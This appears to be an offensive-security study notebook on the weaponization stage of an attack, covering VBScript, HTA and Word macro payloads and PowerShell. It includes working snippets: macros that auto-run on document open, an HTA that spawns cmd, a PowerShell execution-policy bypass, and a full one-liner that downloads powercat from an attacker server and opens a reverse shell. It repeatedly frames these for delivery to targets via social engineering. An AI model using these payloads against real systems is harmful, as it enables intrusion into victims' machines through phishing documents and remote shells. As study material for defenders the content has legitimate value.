#!/usr/bin/env python
# coding: utf-8

# # Killchain - Weaponization
# 
# Weaponization is the process of creating a payload that will be used for an attack. It follows Recon to understand what attacks may work, and preceeds delivery because well... you need something to deliver. In many cases, the payload will be embedded in something else (such as a PDF or email) and these are all included in weaponization.
# 
# <hr>
# 
# 
# 
# 
# 

# ## Windows Example: WSH / Wscript/CScript
# WSH, or the Windows Script Host is a built in tool for automating tasks in the windows OS. It includes 2 engines
# - cscript.exe : For command line
# - wscript.exe : For a UI
# 
# Both execute VisualBasic scripts such as .vbs and .vbe. When a script is run, it runs with the rights of a standard user.<br>
# 
# **Example VBScript (alert box):**<br>
# 
# > Dim message <br>
# > message = "Wassup!!!"<br>
# > MsgBox message
# 
# So, what does this do? First we define a variable "message", then we set it to the value "Wassup!!!" and lastly we display it in a popup/alert/message box. <br>
# 
# 
# **Example VBScript (run shell command):**
Set shell = Wscript.CreateObject("Wscript.Shell")<br>
shell.Run("C:\Windows\System32\Explorer.exe" & WScript.ScriptFullName),0,True
# You can now run this, and it will launch an explorer window. Sometimes a vbs extension can be blocked. Fortunately you can just store it as a .txt file and call the file with an arguement to force the extension.<br>
# 
# > wscript /e:VBScript [sneakyfile.txt]
# 
# <hr>

# ## Windows Example: HTA
# 
# An HTA, or HTML Application is simply a standalone HTML file which can be download and run alone. For our purpose, you embed the attack in a HTML file and then publish this for a target to access (via Social Engineering, redirects, SEO Posioning etc).<br>
# 
# **Example HTA**
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
# When this file is opened/run by the target, it will spawn a CMD window.<br>
# 
# Not so helpful by itself (unless you provide arguemenst to the CMD window), but you can also create a reverse shell using [msfvenom](../Tools/Msfvenom.ipynb) or straight in metasploit itself using exploit/windows/misc/hta_server.
# 
# <hr>

# ## Windows Example: VBA
# 
# VBA, or Visual Basic for Applications, is a microsoft language implimented for their office applications. Its purpose is to enable automation of all interactions in the office environment. Perhaps the most common application is Macros.<br>
# 
# **Example Macro : Popup**<br>
Sub ImAMacro()
  MsgBox ("All your words are belonging to us")
End Sub
# Great, so we've written a macro, but it still needs to be called, or it will just sit there. Not so fun. Set it to run on document open OR Auto open by adding this below our original code.
Sub Document_Open()
  ImAMacro
End Sub

Sub AutoOpen()
  ImAMacro
End Sub
# Now save the document as a macro enabled type. This includes .doc and .docm. You can now try open the file, but it will warn that macros have been disabled, like a good application should. Lets pretend we have been social engineered and click 'enable content'. You should now get your popup :-).<br>
# Honestly, popups arent so fun though. How about we run an exe by joining in our wscript code from before?
# 
# **Example Macro: exe**
Sub MoreFun()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
# This one isnt as straight forward, but you can get the idea. The 2nd line just defines the variable 'payload' as a type 'string'. We can then assign a string to it and go ahead<br>
# 
# Once again, these can all be generated in [msfvenom](../Tools/Msfvenom.ipynb) to create a reverse shell.
# 
# <hr>

# ## Windows Example: Powershell
# 
# Windows Powershell is the 'advanced' terminal application, as opposed to cmd. It is executed in .NET except for some legacy cases. It has 2 levels of execution, Restricted and 'Bypass'. In restricted mode, the execution is limited. You can see your current level with
# 
# > Get-ExecutionPolicy
# 
# You can change this with the set variant of the command
# 
# > Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
# 
# Alternatively, you can launch PS with a bypass arguement
# 
# > powershell -ex bypass -File 'file.ps1'
# 
# Once youre in powershell, theres a usefull tool known as powercat. It is a Powershell script that creates a reverse shell. You can pull it from github
# 
# > git clone https://github.com/besimorhino/powercat.git<br>
# > cd powercat<br>
# > Python3 -m http.server 8080
# 
# On the target machine
# > powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://attackserver:8080/powercat.ps1');powercat -c attackserver -p 1337 -e cmd"
# 
# attackServer is your listener
# 
# <hr>
# 

# In[ ]:




